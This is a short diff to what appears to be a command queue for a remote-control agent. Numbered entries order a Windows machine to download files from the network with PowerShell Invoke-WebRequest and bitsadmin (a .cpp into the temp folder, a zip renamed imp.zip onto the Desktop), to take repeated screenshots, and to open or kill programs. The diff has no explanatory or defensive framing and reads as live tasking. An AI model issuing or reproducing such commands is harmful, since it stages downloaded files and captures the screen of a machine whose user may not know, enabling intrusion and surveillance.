@@ -1,4 +1,4 @@
-exec|powershell.exe Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Aryan810/aryan810.github.io/master/cia.cpp" -OutFile "%temp%/aaaaaaaaaa.cpp"|114
-exec|powershell.exe ii notepad.exe|121
-screenshot||122
-exec|taskkill /IM notepad.exe|123
+exec|bitsadmin /transfer winapiDownload /download /priority high https://aryan810.github.io/files/EnglishVoiceTyping.zip Desktop\imp.zip|124
+screenshot||125
+exec|start Desktop|126
+screenshot||127
